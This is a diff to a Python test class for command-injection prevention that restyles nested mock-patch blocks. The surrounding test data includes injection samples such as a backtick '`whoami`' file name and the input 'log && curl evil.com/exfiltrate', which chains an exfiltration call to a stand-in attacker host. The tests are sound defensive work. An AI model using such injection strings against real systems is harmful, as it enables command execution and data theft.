@@ -188,8 +188,10 @@ class TestCommandInjectionPrevention:
             ["find", "$TMPDIR", "-name", "`whoami`.txt"],
         ]
 
-        with patch("subprocess.run") as mock_run:
-            with patch("subprocess.Popen") as mock_popen:
+        with (
+            patch("subprocess.run") as mock_run,
+            patch("subprocess.Popen") as mock_popen,
+        ):
                 for cmd_args in dangerous_commands:
                     # Test that dangerous arguments are rejected or sanitized
                     # The actual implementation should validate all subprocess arguments
@@ -211,8 +213,10 @@ class TestCommandInjectionPrevention:
             "log && curl evil.com/exfiltrate",
         ]
 
-        with patch("os.system") as mock_system:
-            with patch("subprocess.call") as mock_call:
+        with (
+            patch("os.system") as mock_system,
+            patch("subprocess.call") as mock_call,
+        ):
                 for _user_input in _user_inputs:
                     # Should never call os.system or subprocess with shell=True and user input
                     mock_system.assert_not_called()
